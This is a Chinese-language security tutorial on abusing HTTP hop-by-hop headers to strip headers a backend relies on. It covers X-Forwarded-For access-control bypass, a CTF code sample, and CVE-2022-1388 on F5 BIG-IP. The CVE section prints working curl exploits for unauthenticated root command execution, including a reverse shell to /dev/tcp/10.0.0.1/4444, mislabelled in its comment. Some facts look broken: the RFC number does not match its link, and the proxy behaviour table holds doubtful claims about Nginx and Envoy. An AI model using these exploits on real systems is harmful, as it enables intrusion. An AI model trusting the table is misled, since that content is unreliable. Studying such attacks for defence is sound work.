# hop-by-hop 请求头相关知识

# 0x01 什么是 hop-by-hop

- **定义：** 根据 [RFC 2612 Section 13.5.1](https://datatracker.ietf.org/doc/html/rfc2616#section-13.5.1)，HTTP/1.1 规范默认将以下请求头视为 hop-by-hop 请求头：`Keep-Alive`、`Transfer-Encoding`、`TE`、`Connection`、`Trailer`、`Upgrade`、`Proxy-Authorization` 和 `Proxy-Authenticate`。当代理服务器在请求中遇到这些请求头时，会对其进行处理，且不会将其转发至下一跳节点。

除了这些默认请求头外，用户也可自定义逐跳请求头。方法是[将请求头的键（key）添加到 `Connection` 请求头的值（value）中](https://datatracker.ietf.org/doc/html/rfc2616#section-14.10)，例如：

```http
Connection: close, X-Foo, X-Bar
```

以上代码表示，我们要求代理服务器将 `X-Foo` 和 `X-Bar` 视为 hop-by-hop 请求头，这意味着代理在将请求转发至下一跳之前，会处理并删除这两个请求头。

# 0x02 关于滥用 hop-by-hop 请求头的一些理论

直接删除某些请求头不一定会导致问题。但若能删除一个由前端或 HTTP 请求链中其他代理添加的、原始请求中不存在的请求头，则可能造成不可预测的后果。

例如，在一条 HTTP 请求链中，某代理服务器可能在请求包中插入一个请求头，该请求头可能涉及后端访问控制策略或描述互联网用户的真实地址。若该请求头缺失，可能导致应用程序处理逻辑出错，并输出大量调试错误信息。当前端代理存在转发 hop-by-hop 请求头列表的行为，而非按规定处理这些请求头时，就可能产生问题。因为它添加到请求中的任何请求头，都可能被下一跳（next hop）删除。

前文提及，`Connection` 请求头本身就是一个 hop-by-hop 请求头。这意味着一个符合规范的代理服务器在转发请求时，应按照 `Connection` 请求头中自定义的 hop-by-hop 请求头列表，删除相应的请求头，而不应将此自定义列表通过 `Connection` 请求头转发给下一台服务器。然而研究表明，实际情况可能并不总是符合预期。某些系统似乎会转发整个 `Connection` 请求头，或复制 hop-by-hop 列表并将其附加到自己的 `Connection` 请求头中。

下图展示了 hop-by-hop 请求头可能引发的问题场景，假设后端期望 `X-Important-Header` 并将其纳入逻辑决策：

![image-20260320000920782](./assets/image-20260320000920782.png)

# 0x03 如何发现系统中是否存在 hop-by-hop 请求头问题

一种简易测试方法是利用请求头出现与否会在响应中产生明显差异的特性，例如 Cookie。我们可以将这样一个请求头作为 hop-by-hop 请求头添加到 `Connection` 请求头中。如果请求链中的某个代理符合规范，会删除该 hop-by-hop 请求头，那么当此请求头同时出现在请求和 `Connection` 请求头列表中时，其响应与该请求头完全不出现在请求中时相同，而与它仅出现在请求中、且不作为逐跳请求头列出时的响应不同。

以 Cookie 为例。携带认证 Cookie（如 `Cookie: session=admin`）访问受保护接口 `api/me` 时，服务器可能返回 `HTTP 200`；未认证访问则可能返回 `HTTP 302`。测试流程如下：

- 认证访问，返回 `HTTP 200`

```http
GET /api/me HTTP/1.1
Host: foo.bar
Cookie: session=admin
Connection: close
```

- 未认证访问，返回 `HTTP 302`

```http
GET /api/me HTTP/1.1
Host: foo.bar
Connection: close
```

- 系统中存在合规代理，代理按规范删除 Cookie 请求头，相当于未认证访问，返回 `HTTP 302`

```http
GET /api/me HTTP/1.1
Host: foo.bar
Cookie: session=admin
Connection: close, Cookie
```

通常可使用自动化工具进行测试，例如使用 Burp Suite 的 Intruder 功能并加载[预置的请求头字典](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/BurpSuite-ParamMiner)进行探测。

# 0x04 如何滥用 hop-by-hop 请求头

## 4.1 通过隐藏 X-Forwarded-For 来屏蔽原始 IP 地址

假设场景：前端代理接收用户请求后，会将用户真实 IP 地址添加到 `X-Forwarded-For` (XFF) 请求头中，后端的基础设施与应用程序据此识别用户真实 IP。若系统中存在一个符合规范的代理，当我们将 `X-Forwarded-For` 作为自定义 hop-by-hop 请求头时（即在请求中添加 `Connection: close, X-Forwarded-For`），则后端可能无法接收到用户真实 IP 地址（原因可能是收不到 XFF 头，或收到的 XFF 头值为前端代理的 IP 地址。例如 CloudFoundry 中的 gorouter，在转发请求前若请求中不存在 XFF 头，则会将其前一个设备的 IP 地址设为 XFF 值）。

仅隐藏真实 IP 地址似乎作用有限，但如果系统中存在以下情况，则可能触发访问控制绕过漏洞：

1. 应用系统链：**代理A (IP: 10.1.10.1)** -> **代理B (IP: 10.1.10.2)** -> **后端应用C (IP: 10.1.10.3)** 。
2. 后端应用C 的 `/admin` 路径设有访问控制逻辑：当访问 IP 为 `10.1.10.0/24` 网段时，直接放行。
3. 代理A 会自动添加 XFF 头以记录用户真实 IP。即使尝试传统的 `X-Forwarded-For` 欺骗，代理A 仍会将真实的原始 IP 附加到该请求头，使其形如 `X-Forwarded-For: <攻击者伪造 IP>, <攻击者真实 IP>`，因此应用程序可安全处理欺骗尝试。同时，代理 A 仅仅转发 hop-by-hop 请求头列表，而不对其进行任何处理。
4. 符合规范的代理 B 接收到代理 A 的请求包后，会对 hop-by-hop 请求头列表进行处理。
5. 后端应用C 接收到代理B 转发的请求包，发现没有 XFF 头后，自动为请求包添加 XFF 头，其值为代理B 的 IP 地址。

因此，当攻击者发送一个包含 `Connection: close, X-Forwarded-For` 的请求时，代理B 将删除请求中的 `X-Forwarded-For` 头。结合上述第5点，攻击者即可直接访问 `/admin` 路径。类似案例可参考 [RITSEC-CTF-2019-hop-by-hop](https://github.com/ritsec/RITSEC-CTF-2019/tree/master/Web/hop-by-hop)。

```python
@base_app.route("/admin", methods=["GET"])
def verify():
    allowed_ips = ["direct", "8.8.8.8", "1.1.1.1"]
    try:
        source_ip = request.headers["X-Forwarded-For"]
    except KeyError:
        source_ip = "direct"
    if source_ip not in allowed_ips:
        return render_template("bad.html", ip_addr=source_ip)
    return render_template("admin.html")
```

在此 `verify` 函数中，代码尝试获取 XFF 头，若获取失败则默认值为 "direct"。前置服务为 Apache 时，根据逐跳原则，当 `Connection` 中标明 `X-Forwarded-For` 为逐跳请求头，Apache 在转发给下一跳时会移除 `X-Forwarded-For` 头，导致 `request.headers['X-Forwarded-For']` 抛出异常，从而绕过 IP 检查。

## 4.2 指纹服务

利用该技术删除特定请求头可能触发错误报告。根据特定的错误信息差异，可作为指纹识别手段。

## 4.3 关于《Abusing HTTP hop-by-hop request headers》一文中 SSRF 的说明

[文中](https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers)的观点如下：SSRF（Server-Side Request Forgery，服务器端请求伪造）漏洞允许攻击者诱导服务器发起请求（如 HTTP、FTP 等）。如果攻击者在 SSRF 利用过程中还能控制服务器发起请求时的请求头，则或许可结合 hop-by-hop 攻击进行组合利用。

# 0x05 其他

## 5.1 CVE-2022-1388 — F5 BIG-IP iControl REST 认证绕过（CVSS 9.8）

### 漏洞原理

F5 BIG-IP 的 iControl REST 管理接口默认监听 443 端口，通过 Apache httpd 前端反向代理到后端 Java iControl REST 服务。认证机制依赖 `X-F5-Auth-Token` HTTP 头：

- 前端 Apache 接收请求后，理论上应验证 `X-F5-Auth-Token` 头中的认证令牌
- 后端 iControl REST 在**未收到有效的 `X-F5-Auth-Token` 头时，默认信任该请求为已认证的管理请求**

这是设计缺陷的核心：后端假设认证在前端代理层已完成，本身不执行独立的认证检查。

攻击路径利用了 Apache httpd 对 hop-by-hop 头部的合规处理：

1. 攻击者构造请求，在 `Connection` 头中将 `X-F5-Auth-Token` 声明为逐跳头
2. Apache 解析 `Connection: close, X-F5-Auth-Token`，按 RFC 规范**删除** `X-F5-Auth-Token` 头
3. 转发给后端的请求中**不存在** `X-F5-Auth-Token` 头
4. 后端 iControl REST 未收到令牌，**不会触发认证检查**，直接以 root 权限执行请求

这与 §4.1 中 `X-Forwarded-For` 绕过访问控制的技术路径**完全同构**——本质都是利用代理对 hop-by-hop 头的合规处理，删除后端依赖的安全关键头部。

### 利用方法

```bash
# 通过 hop-by-hop 绕过认证，以 root 权限执行 id 命令
curl -sk -X POST "https://<BIG-IP>/mgmt/tm/util/bash" \
  -H "Host: localhost" \
  -H "Connection: close, X-F5-Auth-Token" \
  -H "X-F5-Auth-Token: anything" \
  -H "Content-Type: application/json" \
  -d '{"command":"run","utilCmdArgs":"-c id"}'

# 创建 root 权限的远程执行命令别名
curl -sk -X POST "https://<BIG-IP>/mgmt/tm/util/bash" \
  -H "Host: localhost" \
  -H "Connection: close, X-F5-Auth-Token" \
  -H "Content-Type: application/json" \
  -d '{"command":"run","utilCmdArgs":"-c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}'
```

利用端点 `/mgmt/tm/util/bash` 直接提供 root 权限的 bash 命令执行。也可通过 `/mgmt/tm/util/serverside-script` 端点执行任意 shell 脚本。

### 影响范围

- **受影响版本：** F5 BIG-IP 11.6.x – 16.1.x（含）
- **修复版本：** 17.0.0 / 16.1.2.2 / 15.1.5.1 / 14.1.4.6 / 13.1.5
- **攻击前提：** 可访问 BIG-IP 管理接口（默认 HTTPS 443 端口）
- **利用结果：** 无需凭据即可获得 root 权限的远程命令执行

### 漏洞发现细节

CVE-2022-1388 是 2022 年最高危漏洞之一，野外利用在漏洞公开后数小时内即出现。漏洞根因：

1. iControl REST 后端设计中，认证是**可选**而非强制——这违反了纵深防御原则
2. Apache 前端与 Java 后端之间存在**信任边界模糊**——后端假设前端已验证
3. Apache 对 hop-by-hop 头的**合规处理**创造了清除认证令牌的通道

## 5.2 各代理/中间件对 hop-by-hop 请求头的处理

| 组件 | 是否按规范处理 hop-by-hop | 备注 |
|------|--------------------------|------|
| **Apache httpd** | ✅ 是 | 完全遵循 RFC，删除 `Connection` 中声明的逐跳头。这是 CVE-2022-1388 和 §4.1 绕过的前提条件 |
| **Nginx** | ❌ 否 | 默认不处理 hop-by-hop 头，直接转发；需通过 `proxy_set_header` 显式剥离 |
| **HAProxy** | ❌ 否 | 默认透传 hop-by-hop 头，需在配置中通过 `http-request del-header` 移除 |
| **OpenResty** | ❌ 否 | 基于 Nginx，行为与 Nginx 一致 |
| **Traefik** | ❌ 否 | 默认透传 |
| **Caddy** | ❌ 否 | v2 默认透传 |
| **Varnish** | ❌ 否 | 默认透传 hop-by-hop 头至后端 |
| **Envoy** | ❌ 否 | 默认透传，需通过 Lua filter 或 WASM 扩展处理 |
| **F5 BIG-IP (Apache 前端)** | ✅ 是 | 与 Apache httpd 行为一致，触发了自身的漏洞 |

> **结论**：当前环境下仅 **Apache httpd** 和基于 Apache 的组件会主动按规范消费 hop-by-hop 头。大部分现代反向代理（Nginx/HAProxy/Envoy）默认透传。因此利用 hop-by-hop 绕过前需先确认前端代理类型。Nginx 通常需要额外配置 `proxy_set_header Connection ""` 才具备同样的安全风险。

# 0x06 参考

- https://paper.seebug.org/1908/#hop-by-hop_1
- https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers